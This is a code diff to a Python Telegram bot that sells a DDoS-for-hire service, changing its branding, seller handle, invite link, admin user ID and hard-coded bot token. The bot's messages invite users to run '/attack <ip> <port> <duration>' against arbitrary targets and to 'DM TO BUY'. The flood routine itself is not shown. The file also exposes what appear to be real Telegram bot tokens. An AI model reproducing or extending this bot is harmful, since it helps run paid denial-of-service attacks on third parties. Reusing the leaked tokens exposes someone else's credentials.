@@ -2,8 +2,8 @@ import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7526293758:AAHR8B1S8ey8SK9wr4mY-QYUKPmTOF0zxfE'
-ADMIN_USER_ID = 5759284972
+TELEGRAM_BOT_TOKEN = '7924558077:AAHIHk1yXKMAsBpv-UpnQ-77ZghAVK2UdJI'
+ADMIN_USER_ID = 7702886430
 USERS_FILE = 'users.txt'
 attack_in_progress = False
 
@@ -23,9 +23,9 @@ users = load_users()
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*❤️Welcome to the GYRANGEYT VIP DDOS ❤️* \n\n"
+        "*❤️Welcome to the SOMS VIP DDOS ❤️* \n\n"
         "*Use /attack <ip> <port> <duration>*\n"
-        "* DM TO BUY :- @GyrangeYT *"
+        "* DM TO BUY :- @SomsPvtt *"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -120,7 +120,7 @@ async def attack(update: Update, context: CallbackContext):
         f"*⚔️ Attack Launched! ⚔️*\n"
         f"*🎯 Target: {ip}:{port}*\n"
         f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥 Join :-https://t.me/Gyrange100 💥*"
+        f"*🔥 Join :-https://t.me/+kRKyJDJYT_djZjZl 💥*"
     ), parse_mode='Markdown')
 
     # Launch attack with fixed packet size and threads
